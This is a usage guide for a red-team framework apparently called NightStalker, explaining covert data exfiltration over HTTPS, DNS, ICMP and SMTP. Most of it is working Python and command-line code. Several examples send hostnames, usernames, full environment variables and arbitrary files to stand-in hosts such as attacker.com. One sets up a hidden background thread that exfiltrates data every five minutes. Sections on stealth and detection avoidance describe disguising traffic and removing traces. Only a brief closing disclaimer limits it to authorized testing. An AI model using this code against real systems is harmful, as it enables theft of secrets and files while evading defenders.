# NightStalker Exfiltration Guide

## Overview
NightStalker provides multiple covert channels for data exfiltration, allowing you to stealthily transfer reconnaissance data and other sensitive information from target systems.

## Available Channels

### 1. **HTTPS Exfiltration**
- **Best for**: Large data, reliable delivery
- **Method**: HTTP POST requests with custom headers
- **Stealth**: Appears as normal web traffic
- **Payload size**: Up to 4KB per chunk

### 2. **DNS Tunneling**
- **Best for**: Bypassing firewalls, stealth
- **Method**: Encoded data in DNS queries
- **Stealth**: Looks like normal DNS traffic
- **Payload size**: Up to 255 bytes per query

### 3. **ICMP Tunneling**
- **Best for**: Network-level stealth
- **Method**: Data in ICMP echo requests
- **Stealth**: Appears as ping traffic
- **Payload size**: Up to 64 bytes per packet

### 4. **SMTP Exfiltration**
- **Best for**: Email-based exfiltration
- **Method**: Data in email attachments or body
- **Stealth**: Appears as normal email
- **Payload size**: Up to 8KB per email

## Usage Methods

### Method 1: Direct Python API

```python
from nightstalker.redteam.exfiltration import CovertChannels

# Initialize exfiltration
exfil = CovertChannels()

# Prepare data
data = {"hostname": "target", "user": "admin", "data": "sensitive_info"}
data_bytes = json.dumps(data).encode('utf-8')

# Configure channels
channel_configs = {
    'https': {
        'target_url': 'https://your-server.com/collect',
        'headers': {'User-Agent': 'Mozilla/5.0...'}
    },
    'dns': {
        'dns_server': '8.8.8.8',
        'domain': 'your-domain.com'
    }
}

# Exfiltrate data
results = exfil.exfiltrate_data(
    data=data_bytes,
    channels=['https', 'dns'],
    channel_configs=channel_configs
)

# Check results
for channel, success in results.items():
    print(f"{channel}: {'SUCCESS' if success else 'FAILED'}")
```

### Method 2: Automated Payload

```python
from nightstalker.redteam.payload_builder import PayloadBuilder

# Create exfiltration payload
builder = PayloadBuilder()

exfil_code = '''
import os, json, socket, platform
import urllib.request

def exfil_data():
    # Gather system info
    data = {
        'hostname': socket.gethostname(),
        'user': os.getenv('USERNAME'),
        'platform': platform.platform()
    }
    
    # Exfiltrate via HTTPS
    try:
        req = urllib.request.Request(
            'https://your-server.com/collect',
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)
        print("Data exfiltrated successfully")
    except Exception as e:
        print(f"Exfiltration failed: {e}")

exfil_data()
'''

# Build payload
output_path = builder.build_payload(
    payload_type="exfiltration",
    payload_code=exfil_code,
    output_format="python"
)
```

### Method 3: CLI Usage

```bash
# Exfiltrate a file
python -m nightstalker.cli exfil --data sensitive_data.json --channels https dns

# Exfiltrate with custom configuration
python -m nightstalker.cli exfil \
    --data recon_results.json \
    --channels https \
    --target https://your-server.com/collect \
    --encrypt
```

## Real-World Examples

### Example 1: System Reconnaissance + Exfiltration

```python
# Gather and exfiltrate system information
import platform, socket, os, json
from nightstalker.redteam.exfiltration import CovertChannels

def gather_and_exfil():
    # Collect system data
    system_info = {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'user': os.getenv('USERNAME'),
        'ip_addresses': [addr[4][0] for addr in socket.getaddrinfo(socket.gethostname(), None)],
        'environment': dict(os.environ)
    }
    
    # Exfiltrate via multiple channels
    exfil = CovertChannels()
    data_bytes = json.dumps(system_info).encode()
    
    results = exfil.exfiltrate_data(
        data=data_bytes,
        channels=['https', 'dns'],
        channel_configs={
            'https': {'target_url': 'https://attacker.com/collect'},
            'dns': {'dns_server': '8.8.8.8', 'domain': 'attacker.com'}
        }
    )
    
    return results
```

### Example 2: File Exfiltration

```python
# Exfiltrate specific files
def exfil_file(filepath):
    with open(filepath, 'rb') as f:
        file_data = f.read()
    
    # Encode file data
    encoded_data = base64.b64encode(file_data)
    
    # Exfiltrate
    exfil = CovertChannels()
    results = exfil.exfiltrate_data(
        data=encoded_data,
        channels=['https'],
        channel_configs={
            'https': {
                'target_url': 'https://attacker.com/upload',
                'headers': {'Content-Type': 'application/octet-stream'}
            }
        }
    )
    
    return results
```

### Example 3: Continuous Monitoring

```python
# Set up continuous data exfiltration
import time
import threading

def continuous_exfil():
    exfil = CovertChannels()
    
    while True:
        # Gather current data
        current_data = gather_current_data()
        
        # Exfiltrate
        exfil.exfiltrate_data(
            data=json.dumps(current_data).encode(),
            channels=['dns'],  # Use DNS for stealth
            channel_configs={
                'dns': {'dns_server': '8.8.8.8', 'domain': 'attacker.com'}
            }
        )
        
        # Wait before next exfiltration
        time.sleep(300)  # 5 minutes

# Run in background
thread = threading.Thread(target=continuous_exfil, daemon=True)
thread.start()
```

## Stealth Techniques

### 1. **Rate Limiting**
```python
# Add delays between exfiltration attempts
import time

for chunk in data_chunks:
    exfil.exfiltrate_data(chunk)
    time.sleep(random.uniform(1, 5))  # Random delay
```

### 2. **Data Encoding**
```python
# Use multiple encoding layers
import base64, zlib

# Compress and encode data
compressed = zlib.compress(data)
encoded = base64.b64encode(compressed)
```

### 3. **Traffic Blending**
```python
# Make exfiltration look like normal traffic
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive'
}
```

## Best Practices

1. **Use Multiple Channels**: Always have backup channels
2. **Encrypt Data**: Use encryption for sensitive data
3. **Rate Limit**: Don't overwhelm the network
4. **Error Handling**: Handle failures gracefully
5. **Clean Up**: Remove traces after exfiltration
6. **Monitor**: Check for detection mechanisms

## Detection Avoidance

- Use legitimate-looking User-Agent strings
- Vary timing between requests
- Use HTTPS to avoid packet inspection
- Keep payload sizes small
- Use DNS tunneling for firewall bypass
- Implement retry logic with exponential backoff

## Troubleshooting

### Common Issues:
1. **HTTPS failures**: Check SSL certificates and network connectivity
2. **DNS failures**: Verify DNS server and domain configuration
3. **ICMP blocked**: Many networks block ICMP
4. **Rate limiting**: Implement delays between requests

### Debug Mode:
```python
import logging
logging.basicConfig(level=logging.DEBUG)

# This will show detailed exfiltration logs
exfil = CovertChannels()
```

## Security Considerations

⚠️ **Important**: This framework is for authorized security research and penetration testing only. Always ensure you have proper authorization before using these techniques.

- Only use on systems you own or have explicit permission to test
- Follow responsible disclosure practices
- Respect privacy and data protection laws
- Document all activities for compliance 